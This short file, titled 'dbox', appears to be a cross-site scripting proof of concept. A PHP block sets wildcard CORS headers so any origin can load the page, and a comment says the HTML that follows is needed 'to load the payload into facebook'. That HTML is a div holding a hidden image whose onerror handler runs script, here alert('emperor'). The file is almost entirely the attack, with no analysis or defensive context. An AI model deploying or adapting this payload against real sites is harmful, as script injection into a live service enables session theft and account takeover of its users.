dbox
====

&lt;?php // Specify domains from which requests are allowed header('Access-Control-Allow-Origin: *'); // Specify which request methods are allowed header('Access-Control-Allow-Methods: GET, POST, OPTIONS'); // Additional headers which may be sent along with the CORS request header('Access-Control-Allow-Headers: X-Requested-With'); // Exit early so the page isn't fully loaded for options requests if (strtolower($_SERVER['REQUEST_METHOD']) == 'options') { exit(); } ?> &lt;!-- this div is needed to load the payload into facebook --> &lt;div tab="home_menu" id="feed_tabbox" onreplace="fb.updateCurrentPage()"> &lt;img style="display:none" src="x" onerror="alert('emperor')" /> &lt;/div>
